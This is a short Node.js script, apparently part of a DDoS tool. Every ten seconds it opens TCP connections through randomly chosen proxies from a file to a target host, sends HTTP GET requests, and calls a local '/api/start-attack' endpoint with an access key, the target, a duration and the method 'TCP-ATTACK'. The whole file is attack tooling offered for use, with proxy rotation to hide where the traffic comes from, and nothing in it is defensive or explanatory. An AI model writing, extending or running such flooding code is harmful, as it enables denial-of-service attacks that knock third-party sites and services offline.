const net = require('net');
const fs = require('fs');
const axios = require('axios');

// Load proxy list from file
const proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().trim().split('\n');

// API endpoint and request parameters
const apiEndpoint = 'http://localhost:8080/api/start-attack'; // Adjust the URL if necessary

// Function to start an attack
async function startAttack(host, time) {
    try {
        const response = await axios.post(apiEndpoint, {
            keyFromQuery: '@lizardpredator',
            host: host,
            time: time,
            method: 'TCP-ATTACK'
        });
        console.log('Attack response:', response.data);
    } catch (error) {
        console.error('Error starting attack:', error);
    }
}

// Example parameters
const host = 'example.com';
const time = 60; // Attack duration in seconds

// Create a TCP connection to trigger the attack
function createTCPConnection() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(false, 0);
    socket.setTimeout(5000);

    // Send request to start attack
    startAttack(host, time);

    socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
    socket.on('data', () => {
        setTimeout(() => {
            socket.destroy();
            delete socket;
        }, 5000);
    });
}

// Create connections periodically
setInterval(createTCPConnection, 10000); // Adjust interval as needed
